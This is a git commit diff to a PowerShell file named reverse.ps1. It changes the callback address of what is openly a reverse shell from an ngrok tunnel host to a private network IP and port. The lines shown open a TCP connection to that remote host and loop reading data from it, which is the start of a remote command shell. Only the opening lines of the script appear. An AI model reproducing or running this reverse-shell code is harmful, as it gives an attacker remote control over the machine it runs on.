94fc3289d1cbd7b5fc7b462619875a1d80861537
Tumelo0321 <maenntombela@gmail.com>
2025-03-14 10:09:21 +0200

    Update reverse.ps1

--- reverse.ps1
+++ reverse.ps1
@@ -1,4 +1,4 @@
-$client = New-Object System.Net.Sockets.TCPClient("7.tcp.eu.ngrok.io", 17203);
+$client = New-Object System.Net.Sockets.TCPClient("192.168.229.239", 2222);
 $stream = $client.GetStream();
 [byte[]]$buffer = 0..65535|%{0};
 while(($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0){
